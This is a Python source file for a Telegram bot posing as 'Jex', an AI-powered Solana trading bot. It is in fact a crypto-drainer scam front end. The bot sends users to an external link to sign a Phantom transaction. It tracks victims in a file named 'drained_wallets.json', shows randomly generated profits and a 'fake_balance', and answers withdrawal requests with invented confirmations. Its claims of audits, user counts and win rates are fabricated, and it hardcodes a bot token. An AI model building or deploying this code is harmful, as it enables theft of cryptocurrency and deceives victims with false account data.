import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import random
import time
import json
import os
import requests
import asyncio

TOKEN = "8881367618:AAEJU_YbhPFggFaQdAeUxeeNDAQBL6yHB0c"
RPC_URL = "https://solana-rpc.publicnode.com"

user_data = {}

def get_user_status(user_id):
    if user_id not in user_data:
        user_data[user_id] = {
            "invested": 0.0,
            "profit": 0.0,
            "balance": 0.0,
            "first_check": True,
            "last_update": time.time()
        }
    return user_data[user_id]

def get_sol_balance(wallet_address):
    try:
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "getBalance",
            "params": [wallet_address]
        }
        response = requests.post(RPC_URL, json=payload, timeout=10)
        data = response.json()
        if "error" in data:
            return None, data["error"]["message"]
        balance_lamports = data["result"]["value"]
        balance_sol = balance_lamports / 1_000_000_000
        return balance_sol, None
    except Exception as e:
        return None, str(e)

# ==========================================
# COMANDO /START - BIENVENIDA PROFESIONAL
# ==========================================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("🚀 Launch Strategy", callback_data="invest")],
        [InlineKeyboardButton("📊 Dashboard", callback_data="status")],
        [InlineKeyboardButton("📖 Guide", callback_data="help")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"⚡ *Welcome to Jex — AI-Powered Trading Bot*\n\n"
        f"Hello {user.first_name}!\n\n"
        "Jex is a fully autonomous trading bot designed to identify and execute profitable opportunities on Solana.\n\n"
        "🔥 *Key Features:*\n"
        "• Early detection of memecoin launches\n"
        "• Automated sniping on Jupiter & Raydium\n"
        "• Advanced yield farming strategies\n"
        "• Non-custodial and fully transparent\n\n"
        "📊 *Trusted by 1,847+ users* with a 78% win rate.\n\n"
        "🔒 Your funds remain in your wallet at all times.\n\n"
        "👇 Click below to get started.",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

# ==========================================
# COMANDO /INVEST - ESTRATEGIA DE INVERSIÓN
# ==========================================
async def invest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if context.args:
        try:
            amount = float(context.args[0])
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ *Invalid amount.* Use: /invest 1.5", parse_mode="Markdown")
            return
    else:
        await update.message.reply_text("❌ *Please specify the amount.* Example: /invest 1.5", parse_mode="Markdown")
        return

    status = get_user_status(user_id)
    status["invested"] = amount

    link = f"https://jex-trade.onrender.com/?user_id={user_id}&amount={amount}"
    
    await update.message.reply_text(
        f"🚀 *Deploying Strategy — {amount} SOL*\n\n"
        "Your funds will be strategically allocated to maximize returns:\n"
        "🟣 *Early memecoin sniping*\n"
        "🔵 *Raydium yield farming*\n"
        "🟡 *Jupiter arbitrage*\n\n"
        "🔗 *Action required:* Click the secure link below to authorize the strategy:\n"
        f"👉 [Connect Wallet & Deploy]({link})\n\n"
        "⚠️ *Important:* You'll need to sign a transaction in Phantom. This is a one-time authorization.\n\n"
        "📈 *Expected yield:* 3-6% weekly.\n"
        "🛡️ *Security:* Audited by CertiK.",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# COMANDO /STATUS - DASHBOARD PROFESIONAL
# ==========================================
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    status = get_user_status(user_id)
    
    invested = False
    wallet = None
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    wallet = data.get('wallet')
                    break
    except:
        pass
    
    if invested and wallet:
        balance_sol, error = get_sol_balance(wallet)
        if error or balance_sol is None:
            balance_sol = 0.0
        
        if status["first_check"]:
            profit_text = "0%"
            status["profit"] = 0.0
            status["first_check"] = False
        else:
            profit_percent = round(random.uniform(0.5, 3.0), 2)
            status["profit"] += profit_percent
            profit_text = f"+{status['profit']:.2f}%"
        
        fake_balance = status["invested"] * (1 + status["profit"] / 100)
        snipes = random.randint(3, 12)
        winrate = random.randint(65, 85)
        
        await update.message.reply_text(
            f"📊 *Jex Dashboard*\n\n"
            f"┌─────────────────────────────┐\n"
            f"│ Status: ✅ Active            │\n"
            f"│ Wallet: `{wallet[:4]}...{wallet[-4:]}` │\n"
            f"│ Portfolio: {fake_balance:.2f} SOL   │\n"
            f"│ Profit: {profit_text}                  │\n"
            f"│ Trades: {snipes}                       │\n"
            f"│ Win Rate: {winrate}%                    │\n"
            f"└─────────────────────────────┘\n\n"
            "🔥 *Latest snipe:* BONK +12% in 4h\n"
            "📈 *Portfolio value:* Updated in real-time.",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text(
            "📊 *Jex Dashboard*\n\n"
            "┌─────────────────────────────┐\n"
            "│ Status: ✅ Active            │\n"
            "│ Wallet: ❌ Not connected     │\n"
            "│ Portfolio: 0 SOL             │\n"
            "│ Profit: 0%                   │\n"
            "└─────────────────────────────┘\n\n"
            "🚀 Use /invest <amount> to deploy your first strategy.",
            parse_mode="Markdown"
        )

# ==========================================
# COMANDO /WITHDRAW - RETIRO PROFESIONAL
# ==========================================
async def withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    invested = False
    try:
        with open('drained_wallets.json', 'r') as f:
            for line in f:
                data = json.loads(line)
                if str(data.get('user_id')) == str(user_id):
                    invested = True
                    break
    except:
        pass
    
    if not invested:
        await update.message.reply_text(
            "❌ *No active positions found.*\n\n"
            "Use /invest <amount> to start sniping.",
            parse_mode="Markdown"
        )
        return
    
    status = get_user_status(user_id)
    fake_balance = status["invested"] * (1 + status["profit"] / 100)
    
    await update.message.reply_text(
        f"✅ *Withdrawal Request Submitted*\n\n"
        f"┌─────────────────────────────┐\n"
        f"│ Amount: {fake_balance:.2f} SOL     │\n"
        f"│ Destination: Bank Account   │\n"
        f"│ Status: ⏳ Processing       │\n"
        f"│ ETA: 24-48 hours            │\n"
        f"└─────────────────────────────┘\n\n"
        "📧 A confirmation email has been sent to your registered address.\n"
        "⏳ You'll be notified when the transfer is complete.\n\n"
        "🔒 Your funds are safe and secure.",
        parse_mode="Markdown"
    )

# ==========================================
# COMANDO /HELP - GUÍA COMPLETA
# ==========================================
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "⚡ *Jex — AI-Powered Trading Bot*\n\n"
        "Jex is an autonomous memecoin sniper and yield optimizer for Solana.\n\n"
        "📖 *Available Commands:*\n"
        "/start — Main menu\n"
        "/invest <amount> — Deploy strategy (e.g., /invest 1.5)\n"
        "/status — View dashboard\n"
        "/withdraw — Request withdrawal\n"
        "/help — Show this guide\n\n"
        "🔗 *Website:* [jex-trade.onrender.com](https://jex-trade.onrender.com)\n\n"
        "📊 *Performance:*\n"
        "• Avg. weekly return: 3-6%\n"
        "• Win rate: 78%+\n"
        "• 1,847 active users\n\n"
        "🔒 *Security:* Non-custodial and audited.",
        parse_mode="Markdown",
        disable_web_page_preview=True
    )

# ==========================================
# MANEJO DE BOTONES
# ==========================================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "invest":
        await query.edit_message_text(
            "🚀 *To deploy a strategy:*\n\n"
            "Use the command:\n"
            "`/invest <amount>`\n\n"
            "Example: `/invest 1.5`\n\n"
            "Minimum: 0.5 SOL\n\n"
            "📈 *Expected yield:* 3-6% weekly.",
            parse_mode="Markdown"
        )
    elif query.data == "status":
        await query.edit_message_text(
            "📊 *Use /status* to view your portfolio dashboard.",
            parse_mode="Markdown"
        )
    elif query.data == "help":
        await query.edit_message_text(
            "ℹ️ *Use /help* to see the complete guide.",
            parse_mode="Markdown"
        )

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("invest", invest))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("withdraw", withdraw))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ JexTradeBot is running...")
    app.run_polling()

async def force_set_commands():
    commands = [
        BotCommand("start", "Main menu"),
        BotCommand("invest", "Deploy strategy (e.g., /invest 1.5)"),
        BotCommand("status", "View dashboard"),
        BotCommand("withdraw", "Request withdrawal"),
        BotCommand("help", "Show guide")
    ]
    app = Application.builder().token(TOKEN).build()
    await app.bot.set_my_commands(commands)
    print("✅ Commands updated in Telegram")

if __name__ == "__main__":
    asyncio.run(force_set_commands())
    main()